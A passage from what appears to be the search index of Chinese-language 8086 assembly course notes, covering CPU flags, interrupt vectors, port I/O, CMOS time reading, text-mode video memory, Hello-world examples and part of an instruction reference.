Flag\uff09\u7528\u4e8e\u7981\u6b62\u3001\u5141\u8bb8\u786c\u4ef6\u4e2d\u65ad<ul> <li>\u5f53 <code>IF=0</code> \u65f6\uff0c\u7981\u6b62\u786c\u4ef6\u4e2d\u65ad</li> <li>\u5f53 <code>IF=1</code> \u65f6\uff0c\u5141\u8bb8\u786c\u4ef6\u4e2d\u65ad</li> </ul> </li> <li>\u6ce8\u610f\uff1a <code>cli</code>(clear interrupt) \u6307\u4ee4\u8bbe\u7f6e <code>IF=0</code>\uff1b<code>sti</code>(set interrupt) \u6307\u4ee4\u8bbe\u7f6e <code>IF=1</code></li> <li>\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684 <code>int 21h</code> \u5c5e\u4e8e\u8f6f\u4ef6\u4e2d\u65ad\uff0c\u662f\u663e\u5f0f(Explicit)\u7684</li> <li>\u786c\u4ef6\u4e2d\u65ad\u662f\u6307\u7531\u786c\u4ef6\u67d0\u4e2a\u4e8b\u4ef6\u89e6\u53d1\uff0c\u5e76\u7531CPU\u81ea\u52a8\u63d2\u5165\u5e76\u8c03\u7528\u4e00\u4e2a\u9690\u5f0f(implicit)\u7684 <code>int n</code> \u6307\u4ee4\u6765\u8c03\u7528\u4e2d\u65ad\u670d\u52a1\u5b50\u51fd\u6570</li> </ul> <p><code>int n</code> \u51fd\u6570\u7684\u6307\u9488\u4fdd\u5b58\u5728 <code>0:n*4</code> \u5904\uff0c\u4f8b\u5982 <code>int 1h</code> \u51fd\u6570\u7684\u9996\u5730\u5740\u4e3a <code>1234h:5678h</code> \uff1a</p> <pre><code>0:4 78h\n0:5 56h\n0:6 34h\n0:7 12h\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u5c06\u5176\u5730\u5740\u4fee\u6539\uff0c\u5c06 <code>int</code> \u4e2d\u65ad\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u5b9e\u73b0\u4fb5\u5165\u3002</p> <p>\u9677\u9631\u6807\u5fd7 TF</p> <ul> <li>TF\uff08Trap Flag\uff09\u4f4d\u4e8e <code>FL</code> \u5bc4\u5b58\u5668\u7b2c\u516b\u4f4d\uff0c\u7528\u4e8e\u8bbe\u7f6e CPU \u7684\u8fd0\u884c\u6a21\u5f0f<ul> <li>\u5f53 <code>TF=1</code> \u65f6\uff0cCPU \u8fdb\u884c\u5355\u6b65\u6a21\u5f0f</li> <li>\u5f53 <code>TF=0</code> \u65f6\uff0cCPU \u8fdb\u884c\u5e38\u89c4\u6a21\u5f0f</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u5f53 CPU \u8fdb\u5165\u5355\u6b65\u6a21\u5f0f\u540e\uff0c\u6bcf\u6267\u884c\u4e00\u6761\u6307\u4ee4\u540e\u90fd\u4f1a\u8ddf\u968f\u6267\u884c\u4e00\u6761 <code>int 01h</code> \u4e2d\u65ad\u6307\u4ee4</li> </ul> <p><code>TF</code> \u5e76\u4e0d\u80fd\u901a\u8fc7\u5355\u72ec\u6307\u4ee4\u4fee\u6539\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u64cd\u4f5c\u7f6e 1\uff1a</p> <pre><code>pushf      ; push FL\npop ax     ; AX = FL\nor ax, 100h; TF\u4f4d\u4e8eFL\u7b2c\u516b\u4f4d\uff0c\u901a\u8fc7or\u6307\u4ee4\u7f6e\u4e00\npush ax    ; \npopf       ; pop FL \u5373 FL=AX,TF=1\n</code></pre>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_13","title":"\u7aef\u53e3","text":"<p>\u7aef\u53e3\u5730\u5740\u72ec\u7acb\u4e8e\u5185\u5b58\u5730\u5740\uff0c\u5e76\u4e14\u4e0d\u50cf\u5185\u5b58\u90a3\u6837\u65e2\u6709\u6bb5\u5730\u5740\u53c8\u6709\u504f\u79fb\u5730\u5740\uff0c\u7aef\u53e3\u5730\u5740\u4ec5\u6709 16 \u4f4d\u504f\u79fb\u5730\u5740\uff0c\u8303\u56f4\u662f <code>[0000h,0FFFFh]</code> \u3002</p> <p>\u8bfb\u5199\u7aef\u53e3\u5730\u5740\u7684\u6307\u4ee4\u662f <code>in</code>,<code>out</code> \uff0c\u4f8b\u5982 <code>in al, 61h</code> \u8868\u793a\u4ece 61h \u53f7\u7aef\u53e3\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u4fe1\u53f7\u5e76\u4fdd\u5b58\u5230 <code>AL</code> \u4e2d\u3002</p> <p>\u4ee5\u4e0b\u7a0b\u5e8f\u5229\u7528\u7aef\u53e3\u5b9e\u73b0\u8f93\u51fa\u5f53\u524d\u65f6\u95f4\u4fe1\u606f\uff1a</p> <pre><code>.386\ndata segment use16\n;\ncurrent_time db \"00:00:00\", 0Dh, 0Ah, '$'\ndata ends\n\ncode segment use16\nassume cs:code, ds:data\nmain:\n    mov ax, data\n    mov ds, ax\n    mov al, 4\n    out 70h, al  ; \u5411 70h \u7aef\u53e3\u53d1\u9001\u4fe1\u53f7 4\uff0c\u8868\u793a\u63a5\u4e0b\u6765\u8981\u8bfb\u6216\u5199CMOS\u7684\u56db\u53f7\u5185\u5b58\u5355\u5143\n    in al, 71h   ; \u4ece 71h \u7aef\u53e3\u8bfb\u53d6CMOS\u7684\u56db\u53f7\u5355\u5143\u4e4b\u503c(BCD\u7801\u683c\u5f0f\u7684\u5c0f\u65f6\u503c)\n                 ; e.g. AL = 19h =&gt; 7pm\n    call convert ; \u8c03\u7528\u51fd\u6570 convert \u8f6c\u6362 AL \u4e2d\u7684\u5c0f\u65f6\u503c\uff0c\u5982\u628a 19h \u8f6c\u6362\u6210 AL='1',AH='9'\n    mov word ptr current_time[0], ax\n    mov al, 2\n    out 70h, al  ; \u540c\u7406\uff0c\u8868\u793a\u63a5\u4e0b\u6765\u8981\u8bfb\u6216\u5199CMOS\u7684\u4e8c\u53f7\u5185\u5b58\u5355\u5143\n    in al, 71h   ; \u8bfb\u53d6BCD\u7801\u683c\u5f0f\u7684\u5206\u949f\u503c\n    call convert\n    mov word ptr current_time[3], ax\n    mov al, 0\n    out 70h, al\n    in al, 71h\n    call convert\n    mov word ptr current_time[6], ax\n    mov ah, 9\n    mov dx, offset current_time\n    int 21h      ; \u8f93\u51fa ds:dx \u6307\u5411\u7684\u5b57\u7b26\u4e32\n    mov ah, 1\n    int 21h      ; \u6572\u4efb\u610f\u952e\u7ee7\u7eed\n    mov ah, 4Ch\n    int 21h      ; return 0\n;---------Convert---------\nconvert:\n    mov ah, al\n    and ah, 0Fh\n    shr al, 4\n    add ah, '0'\n    add al, '0'\n    ret\n;-------End of Convert-----\ncode ends\nend main\n</code></pre> <p>\u5bf9\u4e8e\u4ece\u952e\u76d8\u8bfb\u53d6\u8f93\u5165\uff1a</p> <p>&lt;1&gt; \u9ad8 dos\u4e2d\u65ad\u8c03\u7528</p> <pre><code>mov ah, 1\nint 21h\n</code></pre> <p>\u76f8\u5f53\u4e8e <code>al=getchar()</code> \u4f46\u4e0d\u80fd\u8bfb\u53d6\u65b9\u5411\u952e</p> <p>&lt;2&gt; \u4e2d bios\u4e2d\u65ad\u8c03\u7528(basic input/output system)</p> <pre><code>mov ah, 0\nint 16h\n</code></pre> <p>AX = \u952e\u76d8\u7f16\u7801\uff0c\u53ef\u4ee5\u8bfb\u53d6\u65b9\u5411\u952e\u3001\u529f\u80fd\u952e\u3001PgUp\u7b49\u952e\uff0c\u4f46\u4e0d\u80fd\u8bfb\u53d6\u5355\u72ec\u7684ctrl\u952e</p> <p>&lt;3&gt; \u4f4e \u7aef\u53e3\u64cd\u4f5c</p> <pre><code>in al, 60h\n</code></pre> <p><code>60h</code> \u662f\u952e\u76d8\u8f93\u5165\u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5404\u4e2a\u952e\u7684\u7f16\u7801</p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_14","title":"\u6587\u672c\u6a21\u5f0f\u7684\u663e\u5361\u5730\u5740\u6620\u5c04","text":"<pre><code>code segment\nassume cs:code\nmain:\n    mov ax, 03h    ; 80x25\u6587\u672c\u6a21\u5f0f\n    int 10h\n    mov ax, 0B800h ; \u6587\u672c\u6a21\u5f0f\u4e0b\u7684\u663e\u5b58\u5730\u5740,\u90a3\u4e48\u6700\u5de6\u4e0a\u89d2\u5904\u7684\u5b57\u7b26\u548c\u989c\u8272\u5206\u522b\u7531 0B800:0000 \u548c 0B800:0001 \u51b3\u5b9a\n    mov es, ax     ; \u8ba1\u7b97\u673a\u542f\u52a8\u65f6\u4f1a\u5b9e\u73b0 B800:0000 \u4e0e\u8ddf\u663e\u5361\u76f8\u5e94\u5730\u5740\u7684\u6620\u5c04\n    mov di, 0      ; xor di, di ; xor \u7684\u8fd0\u884c\u901f\u5ea6\u66f4\u5feb\uff0c\u9002\u5408\u8d4b\u521d\u503c0\n    mov al, 'A'\n    mov ah, 71h    ; \u524d\u666f\u8272\u4e3a\u6d45\u7070\u8272\uff0c7\uff1b\u540e\u666f\u8272\u4e3a\u84dd\u8272\uff0c1\n    mov cx, 2000\nzz:\n    mov al, 'A'\n    mov ah, 71h\nagain:\n    mov es:[di], ax ; \u5750\u6807(x,y)\u5bf9\u5e94\u7684\u663e\u5361\u504f\u79fb\u5730\u5740\u4e3a (y*80+x)*2\uff0c\u4e00\u4e2a\u5b57\u6bcd\u663e\u793a\u5360\u636e\u4e24\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f\u663e\u793a\u5185\u5bb9\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u8282\u662f\u989c\u8272\n    add di, 2       ; \u8f6c\u5230\u4e0b\u4e00\u4e2a\u504f\u79fb\u5730\u5740\n    add al, 1\n    sub ah, 1       ; \u987a\u624b\u66f4\u6539\u989c\u8272\n    cmp al, 'Z'+1   ; \u91cd\u590d\u663e\u793a\u5b57\u7b26 A-Z\n    je  zz\n    loop again      ; \u5faa\u73af 2000 \u6b21\n    mov ah, 1\n    int 21h         ; \u6572\u4efb\u610f\u952e\u7ee7\u7eed\n    mov ah, 4Ch     ; return al\n    int 21h\ncode ends\nend main\n\n; 0 \u9ed1    1 \u84dd    2 \u7eff    3 \u9752    4 \u7ea2    5 \u6d0b\u7ea2\n; 6 \u68d5    7 \u767d    8 \u7070    9 \u4eae\u84dd  A \u4eae\u7eff  B \u4eae\u9752\n; C \u4eae\u7ea2  D \u7d2b    E \u9ec4    F \u4eae\u767d\n</code></pre> <p>\u53ef\u4ee5\u5f97\u5230\u7c7b\u4f3c\u5982\u4e0b\u56fe\u6240\u793a\u7684\u6548\u679c\uff1a</p> <p></p>"},{"location":"Courses/8086asm/%E4%BB%80%E4%B9%88%E6%98%AF%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","title":"\u4ec0\u4e48\u662f\u6c47\u7f16\u8bed\u8a00","text":"<p> \u7ea6 543 \u4e2a\u5b57  72 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"},{"location":"Courses/8086asm/%E4%BB%80%E4%B9%88%E6%98%AF%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/#_1","title":"\u6c47\u7f16\u8bed\u8a00\u603b\u62ec","text":"<p>\u673a\u5668\u8bed\u8a00\u7531 01 \u4e32\u7ec4\u6210\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u76f4\u63a5\u901a\u8fc7\u8f93\u5165 01 \u4e32\u6765\u8fdb\u884c\u8ba1\u7b97\u673a\u64cd\u4f5c\uff0c\u4f46\u662f\u8ba1\u7b97\u673a\u4e5f\u65e0\u6cd5\u7406\u89e3\u4eba\u7c7b\u8bed\u8a00\uff0c\u56e0\u6b64\u624d\u9700\u8981\u4ecb\u4e8e\u4eba\u7c7b\u8bed\u8a00\u548c\u673a\u5668\u8bed\u8a00\u4e4b\u95f4\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002</p> <p>\u79f0\u8d8a\u63a5\u8fd1\u4eba\u7c7b\u8bed\u8a00\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u8d8a\u9ad8\u7ea7\uff0c\u90a3\u4e48\u8ba1\u7b97\u673a\u8bed\u8a00\u53ef\u5206\u4e3a\u9ad8\u7ea7\u8bed\u8a00\u3001\u4e2d\u7ea7\u8bed\u8a00\u548c\u4f4e\u7ea7\u8bed\u8a00\u4e09\u7c7b\u3002\u6bd4\u5982 BASIC,Pascal,Fortran \u7b49\u90fd\u5c5e\u4e8e\u9ad8\u7ea7\u8bed\u8a00\uff0cC\u8bed\u8a00\u5c5e\u4e8e\u4e2d\u7ea7\u8bed\u8a00\uff0c\u800c\u6c47\u7f16\u8bed\u8a00\u5219\u5c5e\u4e8e\u4f4e\u7ea7\u8bed\u8a00\u3002</p> <p>\u6c47\u7f16\u8bed\u8a00\u7684\u82f1\u6587\u540d\u79f0\u662f assembly language \uff0c\u7b80\u79f0 ASM</p> <p>\u4e0d\u540c\u7c7b\u578b\u7684 CPU \u7684\u673a\u5668\u8bed\u8a00\u5404\u4e0d\u76f8\u540c\uff0c\u6545\u4e0d\u540c\u7c7b\u578b\u7684 CPU \u5bf9\u5e94\u7684\u6c47\u7f16\u8bed\u8a00\u4e5f\u5404\u4e0d\u76f8\u540c\uff0c\u6bd4\u5982\u5185\u7f6e M1 \u82af\u7247\u7684\u82f9\u679c\u7535\u8111\u548c\u5185\u7f6e Intel \u82af\u7247\u7684PC\u673a\uff0c\u5b83\u4eec\u7684\u6c47\u7f16\u8bed\u8a00\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <p>\u53e6\u5916\uff0c\u6c47\u7f16\u8bed\u8a00\u8fd8\u548c\u64cd\u4f5c\u7cfb\u7edf\u6709\u5173\u7cfb\uff0c\u56e0\u4e3a\u6c47\u7f16\u8bed\u8a00\u4e0d\u50cfC\u8bed\u8a00\u4e00\u6837\u5177\u6709\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u7a0b\u5e8f\u8981\u505a\u5230\u8f93\u5165\u8f93\u51fa\u5fc5\u7136\u8981\u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u8d44\u6e90\uff0c\u800c\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7ed9\u7528\u6237\u7684\u63a5\u53e3\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <ul> <li>DOS \u4e0b\u7684\u6c47\u7f16\u8bed\u8a00\u8981\u8fdb\u884c\u8f93\u5165\u8f93\u51fa\u65f6\u9700\u8981\u8c03\u7528 <code>int 21h</code> \u8fdb\u884c\u4e2d\u65ad</li> <li>Windows \u4e0b\u7684\u6c47\u7f16\u8bed\u8a00\u8981\u8fdb\u884c\u8f93\u5165\u8f93\u51fa\u65f6\u9700\u8981\u8c03\u7528\u7cfb\u7edf\u51fd\u6570\u7684 API </li> <li>Linux \u7cfb\u7edf\u4e0b\u7684\u6c47\u7f16\u8bed\u8a00\u8981\u8fdb\u884c\u8f93\u5165\u8f93\u51fa\u5219\u9700\u8981\u8c03\u7528 <code>int 80h</code> \u8fdb\u884c\u4e2d\u65ad</li> </ul> <p>\u7531\u4e8eDOS\u548cWindows\u90fd\u662f\u57fa\u4e8eIntel CPU\u7684\uff0c\u4e8c\u8005\u6c47\u7f16\u8bed\u8a00\u6709\u5f88\u591a\u76f8\u4f3c\u4e4b\u5904</p> <p>\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u7528\u6237\u7a0b\u5e8f\u6743\u9650\u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6267\u884c cli,sti,int \u7b49\u7279\u6743\u6307\u4ee4\uff0c\u56e0\u6b64\u672c\u8bfe\u7a0b\u9009\u7528DOS\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684 8086 \u6c47\u7f16\u8bed\u8a00\u8fdb\u884c\u8bb2\u89e3\u3002</p>"},{"location":"Courses/8086asm/%E4%BB%80%E4%B9%88%E6%98%AF%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/#_2","title":"\u7b2c\u4e00\u4e2a\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f","text":"<pre><code>data segment\ns db \"Hello,world!\", 0Dh, 0Ah,'$' ; db: define bytes\ndata ends\n\ncode segment\nassume cs:code, ds:data\nmain:\n    mov ax, seg s ; \u7b49\u6548\u4e8e mov ax, data\n    mov ds, ax\n    mov ah, 9\n    mov dx, offset s\n    int 21h ; \u8f93\u51fa\u5b57\u7b26\u4e32 DS:DX -&gt; '$'-terminated string\n    mov ah, 4Ch\n    int 21h\ncode ends\nend main\n</code></pre> <p>\u7a0b\u5e8f\u8f93\u51fa\u770b\u4e0d\u5230\u7684\u8bdd\u5c31\u4f7f\u7528\u7ba1\u9053 <code>./hello.exe &gt; output.txt</code> \u3002\u4e0d\u8fc7\u66f4\u63a8\u8350\u4f7f\u7528\u5982\u4e0b\u4e2d\u65ad\u67e5\u770b\uff1a</p> <pre><code>    mov ah, 1\n    int 21h ; \u6572\u4efb\u610f\u952e\u7ee7\u7eed\n</code></pre> <p>\u53ea\u4f7f\u7528\u4ee3\u7801\u6bb5\u5728\u5c4f\u5e55\u4e0a\u8f93\u51fa Hello, world! \uff1a</p> <pre><code>code segment\nassume cs:code, ds:code\nmain:\n    push cs\n    pop  ds  ; DS=CS\n    mov ah, 9\n    mov dx, offset hi\n    int 21h\n    mov ah, 4Ch\n    int 21h\nhi db 'Hello,world!', 0Dh, 0Ah, '$'\ncode ends\nend main\n</code></pre> <p>\u4e00\u4e2a Windows \u4e0b\u7684\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\uff0c\u4f5c\u7528\u4e3a\u8ba1\u7b97 1 \u5230 100 \u7684\u548c\u5e76\u8f93\u51fa</p> <pre><code>.386 ;\u8bf4\u660e\u8981\u7528\u523032\u4f4d\u5bc4\u5b58\u5668 eax \u7b49\n.model flat, stdcall\noption casemap :none\n\ninclude include\\windows.inc\ninclude include\\kernel32.inc\ninclude include\\user32.inc\n\nincludelib lib\\kernel32.lib\nincludelib lib\\user32.lib\n\n.data\nresult db 100 dup(0); dup:duplicate\u91cd\u590d\n;char result[100]={0};\nformat db \"%d\",0; db:define byte\u5b57\u8282\u7c7b\u578b\n; char format[3]=\"%d\";       \"%d\",0 \u76f8\u5f53\u4e8eC\u8bed\u8a00\u7684 \"%d\\0\"\nprompt db \"The result\",0\n\n.code\nmain:         ; \u6807\u53f7\n    mov eax, 0; eax:extended ax\n    mov ebx, 1\nagain: ; again \u662f label\uff0c\u53ef\u4f5c\u4e3a\u8df3\u8f6c\u6307\u4ee4\u6216\u8005 call \u7684\u76ee\u6807\u5730\u5740\n    add eax, ebx; eax=0+1+2+3\n    add ebx, 1  ; ebx=4\n    cmp ebx, 100; cmp:compare\n    jbe again   ; jbe:jump if below or equal\ninvoke wsprintf, offset result, offset format, eax\n; windows\u7cfb\u7edf\u5185\u90e8\u7684\u51fd\u6570\uff0c\u5bf9\u5e94C\u8bed\u8a00\u6807\u51c6\u5e93\u51fd\u6570 sprintf\n; wsprintf(&amp;result[0], &amp;format[0], eax);\n; \u4f8b\u5982 char buf[100]; wsprintf(buf, \"%d\", 5050); \u5c06 5050 \u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u4fdd\u5b58\u5728\u6570\u7ec4 buf \u4e2d(\"5050\\0\")\ninvoke MessageBox,0,offset result,offset prompt,0\n; \u4e5f\u662fwindows\u7cfb\u7edf\u5185\u90e8\u7684\u51fd\u6570\uff0c\n; MessageBox(0, &amp;result[0], &amp;prompt[0], 0);\n; \u4f5c\u7528\u4e3a\u5f39\u6846\u8f93\u51fa\uff0c\u6807\u9898\u4e3a prompt \uff0c\u6b63\u6587\u4e3a result \uff0c\u6309\u94ae\u5f0f\u6837\u4e3a 0\n; \u7b2c\u4e00\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u5f39\u6846\u7684\u7236\u7a97\u53e3\u7684\u7f16\u53f7\uff0c\u5f53\u4e3a 0 \u65f6\u8868\u793a\u6ca1\u6709\u7236\u7a97\u53e3\n; \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5f39 5050\uff1f \u56e0\u4e3a MessageBox \u53ea\u80fd\u5f39\u5b57\u7b26\u4e32\n    ret\nend main; \u6307\u5b9a\u7a0b\u5e8f\u7684\u8d77\u59cb\u6267\u884c\u70b9\n         ; end\u540e\u9762\u7684\u6807\u53f7\u51b3\u5b9a\u4e86\u7a0b\u5e8f\u521a\u5f00\u59cb\n         ; \u8fd0\u884c\u65f6\u7684eip\u7684\u503c\u3002\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/","title":"\u6307\u4ee4\u901f\u67e5","text":""},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_1","title":"\u6307\u4ee4\u901f\u67e5","text":"<p> \u7ea6 3851 \u4e2a\u5b57  174 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 21 \u5206\u949f</p>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_2","title":"\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":"<p>MOV</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a mov dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = src</li> <li>\u6ce8\u610f\uff1a <ul> <li><code>mov</code> \u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> <li>\u4e24\u4e2a\u64cd\u4f5c\u6570\u5fc5\u987b\u7b49\u5bbd</li> <li>\u4e24\u4e2a\u64cd\u4f5c\u6570\u4e0d\u80fd\u540c\u65f6\u4e3a <code>Mem</code> (\u5185\u5b58\u53d8\u91cf)</li> <li>\u4e0d\u80fd\u628a\u5e38\u6570\u6216\u6bb5\u5bc4\u5b58\u5668\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668</li> </ul> </li> </ul> <p>Warning</p> <pre><code>mov byte ptr [bp+6+si], '$' ; \u5fc5\u987b\u4f7f\u7528 byte ptr \u6307\u5b9a\u5bbd\u5ea6\nmov [bp+6+si], bl           ; \u8fd9\u4e2a\u4e0d\u9700\u8981\uff0c\u81ea\u52a8\u5bf9\u9f50 dl \u5bbd\u5ea6\n</code></pre> <p>PUSH</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a push reg16 | mem16 | reg32 | mem32</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u6839\u636e\u64cd\u4f5c\u6570\u7684\u5bbd\u5ea6\uff0c\u5f00\u8f9f\u6808\u7a7a\u95f4\u5e76\u538b\u5165\u6808</li> <li>\u6ce8\u610f\uff1a <ul> <li><code>push</code> \u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> <li>\u4e0d\u652f\u6301 8 \u4f4d\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570</li> </ul> </li> </ul> <p>POP</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a pop reg16 | mem16 | reg32 | mem32</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u6839\u636e\u64cd\u4f5c\u6570\u7684\u5bbd\u5ea6\uff0c\u4ece\u5806\u6808\u4e2d\u5f39\u51fa\u503c</li> <li>\u6ce8\u610f\uff1a <ul> <li><code>pop</code> \u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> <li>\u4e0d\u652f\u6301 8 \u4f4d\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570</li> </ul> </li> </ul> <p>XCHG</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xchg op1, op2</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ea4\u6362 op1 \u548c op2</li> <li>\u6ce8\u610f\uff1a <code>xchg</code> \u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\uff1b\u4e14\u4e0d\u80fd\u5bf9\u6bb5\u5bc4\u5b58\u5668\u64cd\u4f5c</li> </ul> <p>IN</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a in al, port</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4eceport\u7aef\u53e3\u53f7\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5e76\u4fdd\u5b58\u5728 AL \u4e2d</li> <li>\u6ce8\u610f\uff1a \u7aef\u53e3\u53f7\u7684\u8303\u56f4\u4e3a <code>[0000h,0FFFFh]</code> ,\u5176\u4e2d\u8303\u56f4 <code>[00h,0FFh]</code> \u53ef\u4ee5\u4f7f\u7528\u5e38\u6570\u4f5c\u4e3a\u7aef\u53e3\u53f7\uff1b\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u53ea\u80fd\u4f7f\u7528\u5bc4\u5b58\u5668 DX \u4f5c\u4e3a\u7aef\u53e3\u53f7</li> </ul> <p>OUT</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a out port, al</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5c06 AL \u7684\u503c\u5199\u5165port\u7aef\u53e3\u53f7</li> <li>\u6ce8\u610f\uff1a \u540c\u4e0a\uff0c\u5f53\u7aef\u53e3\u5730\u5740\\(\\gt 0FFh\\)\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528 <code>out dx, al</code></li> </ul> <p>\u6b64\u5904\u7701\u7565\u4e0d\u5e38\u7528\u7684\u5730\u5740\u4f20\u9001\u6307\u4ee4\u3001\u6807\u5fd7\u5bc4\u5b58\u5668\u4f20\u9001\u6307\u4ee4</p> <p>LEA</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a lea dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u53d6\u53d8\u91cf\u7684\u504f\u79fb\u5730\u5740</li> <li>\u6ce8\u610f\uff1a \u7b49\u6548\u4e8e <code>mov dx, offset abc</code> \u4f46\u662f\u53ef\u4ee5\u7528\u6765\u4f5c\u52a0\u6cd5<ul> <li><code>lea dx, ds:[bx+si+3]</code> \u6b63\u786e</li> <li><code>mov dx, bx+si+3</code> \u9519\u8bef</li> <li><code>lea eax, [eax+eax*4]</code> \u5229\u7528 <code>lea</code> \u505a\u5e38\u6570\u4e58\u6cd5</li> <li>\u5bf9\u4e8e16\u4f4d\uff0c\u53ea\u6709<code>bx,bp,si,di</code>\u53ef\u4ee5\u5728\u65b9\u62ec\u53f7\u5185\uff0c\u4e14\u4e24\u4e24\u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\uff1b32\u4f4d\uff0c\u5219\u53ef\u4ee5\u5305\u62ec\u56db\u4e2a\u901a\u7528\u5bc4\u5b58\u5668</li> </ul> </li> </ul> <p>EAX = EAX * 10</p> <p>\u7531\u4e8e\u91cc\u9762\u7684\u4e58\u6570\u53ea\u80fd\u662f 2,4,6,8\uff0c\u5e76\u4e14\u540c\u4e00\u4e2a\u6570\u4e0d\u80fd\u91cd\u590d\u51fa\u73b0\uff0c\u60f3\u8981\u8ba1\u7b97 <code>EAX *= 10</code> \u53ef\u4ee5\uff1a</p> <pre><code>add eax, eax\nlea eax, [eax+eax*4]\n</code></pre> <p>LES</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a les dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5c06src\u6307\u5411\u5730\u5740\u7684\u9ad8\u5341\u516d\u4f4d\u5199\u5165es\uff0c\u4f4e\u5341\u516d\u4f4d\u5199\u5165dest</li> <li>\u6ce8\u610f\uff1a \u7531\u4e8e\u91c7\u53d6\u5c0f\u7aef\u5b58\u50a8\u6cd5\uff0c\u6240\u4ee5\u662f\u540e\u9762\u7684\u5b58\u5165es\uff0c\u4f8b\u5982\uff1a<ul> <li>\u4ece <code>ds:[bx]</code> \u8fde\u7eed\u5b58\u653e\u56db\u4e2a\u5b57\u8282: <code>9A,78,56,34</code></li> <li><code>les di, ds:[bx]</code></li> <li><code>ES=3456h, DI=789Ah</code></li> </ul> </li> </ul> <p>LDS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a lds dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5c06src\u6307\u5411\u5730\u5740\u7684\u9ad8\u5341\u516d\u4f4d\u5199\u5165ds\uff0c\u4f4e\u5341\u516d\u4f4d\u5199\u5165dest</li> <li>\u6ce8\u610f\uff1a \u6ce8\u610f\u4e8b\u9879\u540c\u4e0a</li> </ul> <p>\u4e60\u9898</p> <p>\u8bbe\u6709\u4e00\u5185\u5b58\u5b57X\uff0cX\u7684\u504f\u79fb\u5730\u5740\u4e0e\u6bb5\u5730\u5740\u6309\u987a\u5e8f\u5b58\u653e\u5728\u4ece\u5730\u57401000:10F0\u8d77\u7684\u5185\u5b58\u5355\u5143\u4e2d\uff0c\u8bf7\u5199\u51fa\u6c47\u7f16\u6307\u4ee4\u628aX\u7684\u503c\u8d4b\u503c\u7ed9\u5bc4\u5b58\u5668AX\u3002(\u8981\u6c42\u4f7f\u7528LDS\u6307\u4ee4)</p> <pre><code>mov ax, 1000h\nmov ds, ax\nlds bx, dword ptr 